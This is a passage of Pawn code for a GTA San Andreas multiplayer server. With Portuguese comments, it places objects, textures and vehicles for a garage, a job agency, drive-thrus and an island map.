	conceblue[13] = CreateDynamicObjectEx(19454, 543.15167, -1303.26538, 29.76260,   0.00000, 0.00000, 90.00000);
	conceblue[14] = CreateDynamicObjectEx(19454, 541.38867, -1303.24475, 27.74260,   0.00000, 0.00000, 90.00000);
	conceblue[15] = CreateDynamicObjectEx(19454, 543.14209, -1303.23523, 27.74260,   0.00000, 0.00000, 90.00000);
	conceblue[16] = CreateDynamicObjectEx(19454, 547.93439, -1298.44653, 27.82260,   0.00000, 0.00000, 0.00000);
	conceblue[17] = CreateDynamicObjectEx(19454, 543.10236, -1293.62158, 27.82260,   0.00000, 0.00000, 90.00000);
	conceblue[18] = CreateDynamicObjectEx(19454, 541.36066, -1293.64282, 27.82260,   0.00000, 0.00000, 90.00000);
	conceblue[19] = CreateDynamicObjectEx(19454, 536.66528, -1298.47058, 27.82260,   0.00000, 0.00000, 0.00000);

	for(new i = 0; i != 20 ; i++) SetDynamicObjectMaterial(conceblue[i],0,5886, "garag3_lawn", "bluestucco1");

	suscarro[0] = CreateDynamicObjectEx(19450, 550.43506, -1298.71448, 15.10000,   0.00000, 0.00000, 90.00000);
	suscarro[1] = CreateDynamicObjectEx(19450, 534.39008, -1298.70325, 15.22000,   0.00000, 0.00000, 90.00000);
	suscarro[2] = CreateDynamicObjectEx(19450, 550.42224, -1302.07324, 16.92000,   0.00000, 90.00000, 90.00000);
	suscarro[3] = CreateDynamicObjectEx(19450, 534.41321, -1302.05176, 16.94000,   0.00000, 90.00000, 90.00000);
	suscarro[4] = CreateDynamicObjectEx(19450, 550.42963, -1300.36719, 16.90000,   0.00000, 90.00000, 90.00000);
	suscarro[5] = CreateDynamicObjectEx(19450, 534.38647, -1300.36719, 16.92000,   0.00000, 90.00000, 90.00000);
	suscarro[6] = CreateDynamicObjectEx(19450, 545.70447, -1303.61243, 15.10000,   0.00000, 0.00000, 0.00000);
	suscarro[7] = CreateDynamicObjectEx(19450, 555.16602, -1303.57654, 15.10000,   0.00000, 0.00000, 0.00000);
	suscarro[8] = CreateDynamicObjectEx(19450, 539.11249, -1303.56592, 15.22000,   0.00000, 0.00000, 0.00000);
	suscarro[9] = CreateDynamicObjectEx(19450, 529.62811, -1303.48938, 15.22000,   0.00000, 0.00000, 0.00000);
	suscarro[10] = CreateDynamicObjectEx(19439, 537.30048, -1293.60864, 29.48900,   0.00000, 0.00000, 90.00000);
	suscarro[11] = CreateDynamicObjectEx(19439, 547.18817, -1293.53564, 29.48900,   0.00000, 0.00000, 90.00000);
	suscarro[12] = CreateDynamicObjectEx(19439, 547.18817, -1293.53564, 29.48900,   0.00000, 0.00000, 90.00000);
	suscarro[13] = CreateDynamicObjectEx(19439, 547.18890, -1293.55566, 28.10900,   0.00000, 0.00000, 90.00000);
	suscarro[14] = CreateDynamicObjectEx(19439, 537.29181, -1293.62549, 28.08900,   0.00000, 0.00000, 90.00000);
	for(new i = 0; i != 15 ; i++) SetDynamicObjectMaterial(suscarro[i],0,1786, "cj_tv", "CJ_Black_metal");

	CreateDynamicObject(18070, 542.79016, -1303.86328, 16.74180,   0.00000, 0.00000, 90.00000);
	CreateObject(19379, 533.90607, -1299.12109, 16.19380,   0.00000, 90.00000, 0.00000);
	CreateObject(19379, 523.41656, -1299.10474, 16.19380,   0.00000, 90.00000, 0.00000);
	CreateObject(19379, 544.37262, -1299.11121, 16.19380,   0.00000, 90.00000, 0.00000);
	CreateObject(19379, 554.80957, -1299.11157, 16.19380,   0.00000, 90.00000, 0.00000);
	CreateObject(19379, 561.23450, -1299.12183, 16.17380,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(1502, 540.82831, -1294.36230, 16.22972,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 543.84711, -1294.30164, 16.22970,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3851, 566.54999, -1299.94482, 18.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3851, 560.92419, -1294.28296, 18.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 560.92139, -1294.28455, 22.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 549.61932, -1294.28296, 18.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 523.79071, -1294.28296, 18.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 566.57190, -1299.93591, 22.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3851, 535.06763, -1294.28662, 18.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 535.06665, -1294.28735, 22.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 523.80591, -1294.28296, 22.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 549.61798, -1294.28296, 22.22000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3851, 518.13086, -1299.94397, 18.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3851, 518.12762, -1299.91687, 22.22000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3851, 542.25586, -1299.84009, 26.14000,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(3851, 542.26343, -1295.85291, 26.14000,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(7586, 522.88251, -1299.10388, 10.06000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7586, 561.50806, -1299.06323, 10.06000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2008, 542.35052, -1301.35828, 16.40870,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 538.17157, -1298.41650, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 535.71240, -1298.41333, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 533.21442, -1298.42578, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 530.82068, -1298.41650, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 529.61658, -1297.48621, 16.75850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 529.61658, -1295.46497, 16.75850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 546.73260, -1298.41797, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 549.01483, -1298.41748, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 551.41089, -1298.41724, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 553.78900, -1298.41687, 16.75850,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2773, 554.86383, -1297.47839, 16.75850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 554.86377, -1295.47925, 16.75850,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 543.29041, -1302.92896, 16.28190,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1723, 537.56152, -1294.82922, 16.27860,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 544.97113, -1294.82983, 16.27860,   0.00000, 0.00000, 0.00000);
	//
	vPrivados[0] = CreateVehicle(451, 561.2234, -1298.9009, 17.1470, 74.7000, -1, -1, 100);
	vPrivados[1] = CreateVehicle(541, 522.7571, -1298.9861, 17.0624, -52.0200, -1, -1, 100);
	vPrivados[2] = CreateVehicle(429, 552.3839, -1301.3213, 17.5240, -33.0600, -1, -1, 100);
	vPrivados[3] = CreateVehicle(506, 548.3487, -1301.1477, 17.6875, -33.0600, -1, -1, 100);
	vPrivados[4] = CreateVehicle(559, 536.3944, -1301.2695, 17.6281, 33.0600, -1, -1, 100);
	vPrivados[5] = CreateVehicle(415, 532.2088, -1301.3433, 17.7076, 33.0600, -1, -1, 100);
	// Agência
	// AGENCIA DE EMPREGOS //

	new agenciaempregos = CreateObject(5704, 1310.22534, -1330.18945, 25.12750,   0.00000, 0.00000, 0.00000, 50000.0);
	SetObjectMaterial(agenciaempregos, 4, 4113, "lanbloka", "sl_laoffblokwin1");
	SetObjectMaterial(agenciaempregos, 6, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(agenciaempregos, 15, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(agenciaempregos, 2, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(agenciaempregos, 10, 4101, "stapl", "sl_laexpowall1");
	SetObjectMaterial(agenciaempregos, 8, 4101, "stapl", "sl_laexpowall1");

	CreateObject(18981, 1278.96387, -1375.53772, 11.82920,   0.00000, 90.00000, 0.00000, 50000.0);
	CreateDynamicObject(982, 1283.76965, -1290.96606, 13.14000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(984, 1277.32544, -1384.84692, 13.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(984, 1280.52515, -1384.83752, 13.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(984, 1286.95740, -1378.35327, 13.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(4640, 1271.53491, -1332.38098, 13.95090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(10183, 1282.81702, -1351.06641, 12.53530,   0.00000, 0.00000, -44.64000);
	CreateDynamicObject(10183, 1282.95984, -1311.45264, 12.49530,   0.00000, 0.00000, -44.64000);
	CreateDynamicObject(966, 1270.39490, -1335.18579, 12.32510,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(984, 1270.35938, -1349.41614, 13.10070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(984, 1270.51270, -1324.22363, 13.10070,   0.00000, 0.00000, 0.00000);
	CreateObject(18981, 1281.20496, -1350.51941, 11.96920,   0.00000, 90.00000, 0.00000, 50000.0);
	CreateObject(18981, 1281.15332, -1325.49792, 11.96920,   0.00000, 90.00000, 0.00000, 50000.0);
	CreateObject(18981, 1280.27417, -1300.54138, 11.96920,   0.00000, 90.00000, 0.00000, 50000.0);
	CreateDynamicObject(1280, 1301.81409, -1374.02271, 13.11320,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1280, 1301.81409, -1379.05872, 13.11320,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1280, 1301.81250, -1383.55334, 13.11320,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1280, 1319.09558, -1383.77808, 13.23320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1319.20630, -1379.05872, 13.23320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1319.20630, -1374.02271, 13.23320,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1321.47290, -1383.16772, 13.81270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1321.26294, -1381.38892, 13.81270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1321.34900, -1379.35022, 13.81270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1321.36108, -1375.72644, 13.77270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1321.38281, -1377.33472, 13.81270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1321.49365, -1374.24988, 13.81270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1298.86523, -1374.23071, 13.65270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1298.92737, -1377.15320, 13.65270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1298.83777, -1379.62952, 13.65270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1298.78394, -1381.58228, 13.77270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(870, 1298.93286, -1383.23914, 13.65270,   0.00000, 0.00000, 0.00000);

	// FIM AGENCIA //
	// DriveThrus
    // Lampadas
    CreateObject(3666,796.2999900,-1632.8000000,12.9000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,804.2999900,-1633.0000000,13.1000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,2402.7000000,-1509.9000000,23.3000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,2402.7002000,-1501.9004000,23.3000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,1183.8000000,-898.0999800,42.8000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,1185.2000000,-906.4000200,42.8000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,-2348.2000000,-156.6000100,34.8000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,-2348.2000000,-148.2000000,34.8000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,1861.1000000,2089.6001000,10.3000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,1861.0000000,2080.8999000,10.3000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,2483.8999000,2017.9000000,10.3000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3666,2483.8000000,2026.7000000,10.3000000,0.0000000,0.0000000,0.0000000);
    // Posters
    CreateObject(2642,2483.7000000,2018.5000000,11.0000000,0.0000000,0.0000000,0.0000000);
    CreateObject(2642,1861.3000000,2089.1001000,11.0000000,0.0000000,0.0000000,170.0000000);
    CreateObject(2642,-2347.6884800,-148.8769500,36.1853800,0.0000000,0.0000000,0.0000000);
    CreateObject(2642,-2347.7000000,-148.6000100,35.3000000,0.0000000,0.0000000,178.0000000);
    CreateObject(2642,795.2999900,-1632.9000000,13.3000000,0.0000000,0.0000000,210.0000000);
    CreateObject(2642,1184.2000000,-905.7999900,43.2000000,0.0000000,0.0000000,220.0000000);
    CreateObject(2642,2401.8000000,-1502.0000000,23.8000000,0.0000000,0.0000000,220.0000000);
    // Bases
    CreateObject(3881,799.7999900,-1635.4000000,14.3000000,0.0000000,0.0000000,270.0000000);
    CreateObject(3881,2404.3999000,-1506.4000000,24.9000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3881,1186.4000000,-902.4000200,43.8000000,0.0000000,0.0000000,8.0000000);
    CreateObject(3881,-2346.7000000,-152.8999900,36.2000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3881,1862.5000000,2084.7000000,11.7000000,0.0000000,0.0000000,0.0000000);
    CreateObject(3881,2483.2000000,2022.8000000,11.9000000,0.0000000,0.0000000,180.0000000);
	// Interior Agência
	CreateDynamicObject(2395, 232, 116.2, 1002.20001,0,0, 90);
    CreateDynamicObject(2395, 232, 116.4, 1004.94,0,0, 90);
    CreateDynamicObject(2395, 260.29999, 126, 1003.59998,0,0, 270);
    CreateDynamicObject(2395, 260.29999, 116, 1003.59998,0,0, 270);
    CreateDynamicObject(2395, 260.29999, 116, 1006.34003,0,0, 270);
    CreateDynamicObject(2395, 260.29999, 126, 1006.34003,0,0, 270);
	// NOVA ILHA
	AddStaticVehicleEx(454,2603.5000000,-3397.1999512,0.9000000+2,0.0000000,165,169,15); //Tropic
	AddStaticVehicleEx(472,2320.6999512,-3576.6000977,0.0000000+2,12.0000000,158,164,15); //Coastguard
	AddStaticVehicleEx(510,2465.3999023,-3483.3999023,7.5000000+2,0.0000000,215,142,15); //Mountain Bike
	AddStaticVehicleEx(510,2432.5000000,-3509.8000488,7.5999999+2,0.0000000,215,142,15); //Mountain Bike
	AddStaticVehicleEx(424,2424.3000488,-3516.3000488,7.6999998+2,346.0000000,156,161,15); //BF Injection
	AddStaticVehicleEx(424,2447.5000000,-3497.6000977,7.5999999+2,345.9979248,156,161,15); //BF Injection
	AddStaticVehicleEx(424,2456.3000488,-3491.0000000,7.5999999+2,345.9979248,199,166,15); //BF Injection
	AddStaticVehicleEx(568,2584.5000000,-3443.6999512,7.6999998+2,0.0000000,45,58,15); //Bandito
	AddStaticVehicleEx(424,2580.3999023,-3442.6000977,7.5999999+2,0.0000000,81,84,15); //BF Injection
	AddStaticVehicleEx(468,2577.5000000,-3442.6000977,7.5000000+2,0.0000000,132,4,15); //Sanchez
	AddStaticVehicleEx(471,2320.5000000,-3615.5000000,2.5999999+2,336.0000000,19,69,15); //Quad
	AddStaticVehicleEx(539,2552.6999512,-3497.3999023,0.5000000+2,90.0000000,133,31,15); //Vortex
	AddStaticVehicleEx(568,2422.8000488,-3643.1000977,31.5000000+2,272.0000000,94,112,15); //Bandito
	AddStaticVehicleEx(487,2406.8000488,-3630.1000977,31.0000000+2,0.0000000,132,4,15); //Maverick
	AddStaticVehicleEx(422,2497.8000488,-3603.1999512,36.7999992+2,92.0000000,106,122,15); //Bobcat
	AddStaticVehicleEx(510,2476.8000488,-3591.6000977,39.4000015+2,308.0000000,134,68,15); //Mountain Bike
	AddStaticVehicleEx(510,2482.3000488,-3605.1999512,38.5000000+2,287.9962158,134,68,15); //Mountain Bike
	AddStaticVehicleEx(446,2485.6000977,-2706.5000000,0.0000000+2,180.0000000,132,4,15); //Squalo
	CreateDynamicObject(17081,2455.5000000,-3542.0000000,3.5000000,0.0000000,0.0000000,262.7490234); //object(cuntwland06b) (1)
	CreateDynamicObject(4842,2507.5996094,-3437.1992188,-2.5000000,0.0000000,0.0000000,225.9997559); //object(beach1_las0fg) (1)
	CreateDynamicObject(745,2551.7998047,-3445.1992188,6.5999999,0.0000000,0.0000000,307.9962158); //object(sm_scrub_rock5) (2)
	CreateDynamicObject(745,2546.6000977,-3445.0000000,6.6999998,0.0000000,0.0000000,205.9962158); //object(sm_scrub_rock5) (3)
	CreateDynamicObject(746,2542.6999512,-3444.3000488,7.1999998,0.0000000,0.0000000,80.0000000); //object(sm_scrub_rock2) (1)
	CreateDynamicObject(746,2535.8999023,-3444.1999512,6.9000001,0.0000000,0.0000000,275.9969482); //object(sm_scrub_rock2) (2)
	CreateDynamicObject(746,2540.3999023,-3444.6999512,7.0000000,0.0000000,0.0000000,60.0000000); //object(sm_scrub_rock2) (3)
	CreateDynamicObject(746,2538.1999512,-3444.1999512,7.0999999,0.0000000,0.0000000,299.9963379); //object(sm_scrub_rock2) (4)
	CreateDynamicObject(748,2533.6999512,-3443.0000000,7.0999999,0.0000000,0.0000000,0.0000000); //object(sm_scrb_grp1) (1)
	CreateDynamicObject(748,2530.8999023,-3438.0000000,6.5999999,0.0000000,0.0000000,0.0000000); //object(sm_scrb_grp1) (2)
	CreateDynamicObject(745,2529.1000977,-3441.3000488,6.6999998,0.0000000,0.0000000,141.9936523); //object(sm_scrub_rock5) (4)
	CreateDynamicObject(896,2478.2998047,-3449.0000000,2.2000000,0.0000000,179.9945068,57.9968262); //object(searock06) (1)
	CreateDynamicObject(896,2483.7998047,-3436.3994141,2.0000000,0.0000000,179.9945068,233.9923096); //object(searock06) (2)
	CreateDynamicObject(900,2493.7998047,-3425.0000000,4.9000001,0.0000000,0.0000000,49.9987793); //object(searock04) (1)
	CreateDynamicObject(896,2500.5000000,-3414.1999512,1.0000000,0.0000000,179.9945068,39.9968262); //object(searock06) (3)
	CreateDynamicObject(900,2509.3999023,-3400.5000000,3.9000001,0.0000000,0.0000000,257.9987793); //object(searock04) (2)
	CreateDynamicObject(901,2519.1999512,-3402.3999023,1.7000000,0.0000000,0.0000000,54.0000000); //object(searock05) (1)
	CreateDynamicObject(901,2514.3000488,-3389.8999023,-0.3000000,0.0000000,0.0000000,103.9978027); //object(searock05) (2)
	CreateDynamicObject(901,2502.5000000,-3393.6999512,-0.5000000,0.0000000,0.0000000,237.9965820); //object(searock05) (3)
	CreateDynamicObject(12808,2509.0000000,-3443.1000977,7.8000002,0.0000000,0.0000000,202.0000000); //object(sw_logs3) (1)
	CreateDynamicObject(770,2596.6999512,-3463.1999512,7.1999998,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (1)
	CreateDynamicObject(770,2585.0996094,-3480.1992188,6.5999999,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (2)
	CreateDynamicObject(770,2585.0000000,-3508.5000000,5.1999998,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (3)
	CreateDynamicObject(770,2535.0000000,-3481.8994141,2.0999999,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (5)
	CreateDynamicObject(770,2492.1000977,-3501.8999023,3.4000001,0.0000000,0.0000000,0.0000000); //object(pinebg_hi) (6)
	CreateDynamicObject(768,2596.0996094,-3527.3994141,5.1999998,0.0000000,0.0000000,0.0000000); //object(elmtreegrn2_hi) (1)
	CreateDynamicObject(768,2523.1000977,-3500.8999023,0.9000000,0.0000000,0.0000000,0.0000000); //object(elmtreegrn2_hi) (2)
	CreateDynamicObject(768,2558.2998047,-3563.0996094,3.4000001,0.0000000,0.0000000,0.0000000); //object(elmtreegrn2_hi) (3)
	CreateDynamicObject(889,2588.1999512,-3466.0000000,7.0000000,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (1)
	CreateDynamicObject(889,2598.0000000,-3478.8999023,9.1999998,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (2)
	CreateDynamicObject(889,2513.8000488,-3491.3999023,2.5000000,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (3)
	CreateDynamicObject(889,2551.5000000,-3480.5996094,1.8000000,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (4)
	CreateDynamicObject(889,2607.5000000,-3514.1999512,7.9000001,0.0000000,0.0000000,0.0000000); //object(pinebg_po) (5)
	CreateDynamicObject(895,2590.8000488,-3473.0000000,7.0999999,0.0000000,0.0000000,0.0000000); //object(elmweesm_po) (1)
	CreateDynamicObject(895,2594.8999023,-3506.5000000,6.5999999,0.0000000,0.0000000,0.0000000); //object(elmweesm_po) (2)
	CreateDynamicObject(895,2525.1000977,-3483.0000000,2.3000000,0.0000000,0.0000000,0.0000000); //object(elmweesm_po) (3)
	CreateDynamicObject(736,2599.5000000,-3491.3000488,20.2999992,0.0000000,0.0000000,0.0000000); //object(ceasertree01_lvs) (1)
	CreateDynamicObject(736,2588.6999512,-3494.3999023,19.1000004,0.0000000,0.0000000,0.0000000); //object(ceasertree01_lvs) (2)
	CreateDynamicObject(736,2592.8994141,-3562.6992188,22.5000000,0.0000000,0.0000000,0.0000000); //object(ceasertree01_lvs) (3)
	CreateDynamicObject(715,2600.3000488,-3501.5000000,15.8000002,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (1)
	CreateDynamicObject(715,2593.0996094,-3539.7998047,14.3999996,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (2)
	CreateDynamicObject(715,2591.0000000,-3585.1999512,20.0000000,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (3)
	CreateDynamicObject(715,2592.3999023,-3610.6999512,22.8999996,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (4)
	CreateDynamicObject(715,2566.8999023,-3631.8999023,22.6000004,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (5)
	CreateDynamicObject(715,2547.8999023,-3647.0000000,25.2000008,0.0000000,0.0000000,0.0000000); //object(veg_bevtree3) (6)
	CreateDynamicObject(11490,2592.3000488,-3452.0000000,6.6999998,0.0000000,0.0000000,180.0000000); //object(des_ranch) (2)
	CreateDynamicObject(11491,2592.3000488,-3441.0000000,8.1999998,0.0000000,0.0000000,180.0000000); //object(des_ranchbits1) (1)
	CreateDynamicObject(1637,2550.3994141,-3434.0000000,8.1000004,0.0000000,0.0000000,85.9954834); //object(od_pat_hutb) (1)
	CreateDynamicObject(1641,2578.3000488,-3433.8000488,6.8000002,0.0000000,0.0000000,0.0000000); //object(beachtowel03) (1)
	CreateDynamicObject(1640,2576.8000488,-3433.6999512,6.8000002,0.0000000,0.0000000,0.0000000); //object(beachtowel04) (1)
	CreateDynamicObject(1642,2575.3000488,-3433.6999512,6.8000002,0.0000000,0.0000000,0.0000000); //object(beachtowel02) (1)
	CreateDynamicObject(1643,2573.6000977,-3433.6999512,6.8000002,0.0000000,0.0000000,0.0000000); //object(beachtowel01) (1)
	CreateDynamicObject(1461,2552.0996094,-3434.0000000,7.5999999,0.0000000,0.0000000,171.9964600); //object(dyn_life_p) (1)
	CreateDynamicObject(1255,2580.0996094,-3435.5996094,7.3000002,0.0000000,0.0000000,109.9951477); //object(lounger) (1)
	CreateDynamicObject(1255,2582.0000000,-3434.8999023,7.3000002,0.0000000,0.0000000,109.9951172); //object(lounger) (2)
	CreateDynamicObject(1645,2571.3000488,-3434.1999512,7.0999999,0.0000000,0.0000000,168.0000000); //object(lounge_wood_up) (1)
	CreateDynamicObject(946,2569.3999023,-3442.1000977,9.0000000,0.0000000,0.0000000,270.0000000); //object(bskball_lax) (1)
	CreateDynamicObject(1723,2588.3000488,-3452.1000977,8.1999998,0.0000000,0.0000000,0.0000000); //object(mrk_seating1) (1)
	CreateDynamicObject(1724,2591.1999512,-3452.8999023,8.1999998,0.0000000,0.0000000,270.0000000); //object(mrk_seating1b) (1)
	CreateDynamicObject(2313,2589.6999512,-3455.8000488,8.1999998,0.0000000,0.0000000,180.0000000); //object(cj_tv_table1) (1)
	CreateDynamicObject(1752,2589.0000000,-3456.0000000,8.6999998,0.0000000,0.0000000,178.0000000); //object(swank_tv_3) (1)
	CreateDynamicObject(15036,2595.3000488,-3454.0000000,9.3999996,0.0000000,0.0000000,90.0000000); //object(kit_cab_washin_sv) (1)
	CreateDynamicObject(2637,2594.1000977,-3452.8000488,8.6000004,0.0000000,0.0000000,270.0000000); //object(cj_pizza_table2) (1)
	CreateDynamicObject(1828,2592.6000977,-3451.3999023,8.1999998,0.0000000,0.0000000,0.0000000); //object(man_sdr_rug) (1)
	CreateDynamicObject(1840,2589.8000488,-3455.8000488,8.6999998,0.0000000,0.0000000,270.0000000); //object(speaker_2) (1)
	CreateDynamicObject(1840,2588.1999512,-3455.8000488,8.6999998,0.0000000,0.0000000,270.0000000); //object(speaker_2) (2)
	CreateDynamicObject(2002,2596.3000488,-3451.5000000,8.1999998,0.0000000,0.0000000,270.0000000); //object(water_coolnu) (1)
	CreateDynamicObject(2100,2587.8999023,-3450.6999512,8.1999998,0.0000000,0.0000000,90.0000000); //object(med_hi_fi_2) (1)
	CreateDynamicObject(2029,2590.8000488,-3447.1999512,8.1999998,0.0000000,0.0000000,0.0000000); //object(swank_dinning_1) (2)
	CreateDynamicObject(2029,2592.8000488,-3447.1999512,8.1999998,0.0000000,0.0000000,0.0000000); //object(swank_dinning_1) (3)
	CreateDynamicObject(2124,2594.8999023,-3447.1999512,9.0000000,0.0000000,0.0000000,0.0000000); //object(swank_din_chair_1) (1)
	CreateDynamicObject(2124,2589.8000488,-3447.1999512,9.0000000,0.0000000,0.0000000,180.0000000); //object(swank_din_chair_1) (2)
	CreateDynamicObject(2124,2591.3999023,-3446.3999023,9.0000000,0.0000000,0.0000000,90.0000000); //object(swank_din_chair_1) (3)
	CreateDynamicObject(2124,2592.3999023,-3446.3999023,9.0000000,0.0000000,0.0000000,90.0000000); //object(swank_din_chair_1) (6)
	CreateDynamicObject(2124,2593.3999023,-3446.3999023,9.0000000,0.0000000,0.0000000,90.0000000); //object(swank_din_chair_1) (7)
	CreateDynamicObject(2124,2593.5000000,-3447.8999023,9.0000000,0.0000000,0.0000000,270.0000000); //object(swank_din_chair_1) (8)
	CreateDynamicObject(2124,2592.3999023,-3447.8999023,9.0000000,0.0000000,0.0000000,270.0000000); //object(swank_din_chair_1) (9)
	CreateDynamicObject(2124,2591.3999023,-3447.8999023,9.0000000,0.0000000,0.0000000,270.0000000); //object(swank_din_chair_1) (10)
	CreateDynamicObject(17026,2632.3000488,-3441.1999512,-4.0000000,0.0000000,0.0000000,284.0000000); //object(cunt_rockgp2_) (1)
	CreateDynamicObject(17026,2612.6999512,-3478.5000000,-0.2000000,0.0000000,0.0000000,314.0000000); //object(cunt_rockgp2_) (2)
	CreateDynamicObject(17026,2612.0000000,-3524.7998047,-4.0999999,0.0000000,0.0000000,317.9937744); //object(cunt_rockgp2_) (3)
	CreateDynamicObject(17026,2607.8000488,-3564.1999512,-0.5000000,0.0000000,0.0000000,329.9937744); //object(cunt_rockgp2_) (4)
	CreateDynamicObject(18228,2616.0000000,-3612.0000000,4.6999998,0.0000000,0.0000000,57.9968262); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(896,2616.0000000,-3626.6992188,16.0000000,0.0000000,0.0000000,353.9959717); //object(searock06) (4)
	CreateDynamicObject(901,2615.0000000,-3603.0000000,20.3999996,0.0000000,0.0000000,91.9995117); //object(searock05) (4)
	CreateDynamicObject(880,2612.1999512,-3591.3000488,17.1000004,0.0000000,0.0000000,168.0000000); //object(p_rubble0bcol) (1)
	CreateDynamicObject(18228,2596.6999512,-3643.3000488,5.1999998,0.0000000,0.0000000,351.9968262); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(896,2585.1000977,-3646.1999512,16.5000000,0.0000000,0.0000000,263.9959717); //object(searock06) (4)
	CreateDynamicObject(901,2604.1000977,-3637.8000488,17.2000008,0.0000000,0.0000000,157.9995117); //object(searock05) (4)
	CreateDynamicObject(18228,2555.3000488,-3663.3000488,5.5000000,0.0000000,0.0000000,351.9964600); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(18228,2513.6999512,-3680.5000000,3.5000000,0.0000000,0.0000000,351.9964600); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(18228,2478.1992188,-3692.5000000,0.0000000,0.0000000,0.0000000,301.9921875); //object(cunt_rockgp2_21) (1)
	CreateDynamicObject(901,2466.3999023,-3688.3000488,15.0000000,6.1371155,82.0895386,208.4192657); //object(searock05) (4)
	CreateDynamicObject(17031,2444.8999023,-3670.5000000,-0.3000000,0.0000000,0.0000000,228.0000000); //object(cunt_rockgp2_13) (1)
	CreateDynamicObject(17031,2445.6999512,-3667.8000488,10.0000000,0.0000000,0.0000000,47.9992676); //object(cunt_rockgp2_13) (2)
	CreateDynamicObject(17071,2441.5000000,-3700.0000000,0.0000000,0.0000000,0.0000000,0.0000000); //object(cunt_rockgp2_25) (1)
